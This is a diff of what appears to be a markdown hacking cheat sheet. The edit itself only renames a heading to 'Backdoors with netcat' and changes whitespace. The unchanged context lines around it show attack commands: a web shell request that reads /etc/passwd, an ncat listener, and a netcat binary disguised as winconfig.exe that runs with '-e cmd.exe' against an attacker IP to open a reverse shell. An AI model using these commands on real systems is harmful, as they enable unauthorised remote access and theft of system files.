@@ -178,7 +178,7 @@ Content-length: [number you got with wc -m payload]
 http://victim.site/shell.php?cmd=cat+/etc/passwd
 ```
 
-## Backdoors
+## Backdoors with netcat
 
 ### The attacker initiates the connection
 
@@ -224,4 +224,4 @@ ncat -l -p <port> -v
 “C:\Windows/System32\winconfig.exe <attacker IP> <port> -e cmd.exe”
 # For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
 ```
-
+ 
